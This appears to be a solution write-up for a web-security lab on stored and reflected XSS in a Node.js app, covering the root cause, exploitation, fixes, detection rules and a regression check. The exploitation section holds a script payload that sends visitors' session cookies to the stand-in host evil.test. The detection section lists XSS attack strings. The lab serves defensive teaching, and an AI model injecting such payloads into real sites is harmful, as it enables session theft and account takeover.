# VULN-02 — Solution (spoilers)

## 1. Root cause
`app/server.js` builds HTML by string-concatenating user input with no encoding:

```js
// stored sink
`<li><b>${m.name}</b>: ${m.message}</li>`
// reflected sink
`<p>You searched for: ${q}</p>`
```

Anything a user submits is interpreted as HTML. A `<script>` in `message` is
stored and then served to **every** visitor (stored XSS); a `<script>` in `q`
runs for anyone who opens the crafted link (reflected XSS).

Two conditions turn that into account takeover:
- `Set-Cookie: session=...` has **no `HttpOnly`** → `document.cookie` is readable
  from JS.
- **No `Content-Security-Policy`** → inline/injected scripts execute freely.

## 2. Exploitation
Stored, via the UI:
```html
<script>new Image().src='http://evil.test/c?'+document.cookie</script>
```
Post it as a message; every visitor's browser now sends their `session` cookie
to `evil.test`. Reflected, via a link you send the victim:
```
http://localhost:3000/search?q=<script>alert(document.cookie)</script>
```
Scripted PoC:
```bash
node exploit/xss_exploit.js http://localhost:3000
```
Vulnerable output:
```
stored XSS injected & reflected back : true
reflected XSS reflected back         : true
session cookie HttpOnly              : false
Content-Security-Policy              : (none)
[!] XSS REPRODUCED — build is VULNERABLE
```

## 3. Remediation (see `fixed/server.js`)
Three layers, in order of importance:

**(1) Output encoding — the real fix.** HTML-escape every piece of user data at
the point it enters the page:
```js
function esc(s){return String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
  .replace(/"/g,'&quot;').replace(/'/g,'&#x27;');}
```
`<script>` becomes `&lt;script&gt;` — shown as text, never executed. Encode for
the *context* (HTML body here; attributes, JS and URLs need different encoding).

**(2) Content-Security-Policy — defense in depth.**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```
Even if an encoding bug slips through, the browser refuses to run inline or
third-party script.

**(3) HttpOnly + SameSite cookie.**
```
Set-Cookie: session=...; HttpOnly; SameSite=Strict
```
JS can no longer read the cookie, so a successful injection still can't steal
the session.

### Principles
- **Never** build HTML by concatenating untrusted strings. Use a templating
  engine that auto-escapes, or escape explicitly.
- Filtering/"sanitizing input" is not the fix — encode on **output**, per
  context. Input allowlists are a secondary control.
- CSP and HttpOnly reduce blast radius; they don't replace encoding.

## 4. Detection (blue-team)
- Requests whose parameters contain `<script`, `onerror=`, `javascript:`,
  `<img`, `%3Cscript` (URL-encoded) — alert on these in WAF/access logs.
- Stored content served back with raw `<` / `>` in fields that should be text.
- Outbound requests from the app's pages to unknown domains (exfil beacons).

Pseudo-Sigma:
```
detection:
  selection:
    uri_query|contains:
      - '<script'
      - 'onerror='
      - 'javascript:'
  condition: selection
```

## 5. Verify the fix
```bash
node exploit/xss_exploit.js http://localhost:3001   # exits 1 => FIXED
```
Wire this into CI so a regression that drops the encoding fails the build.
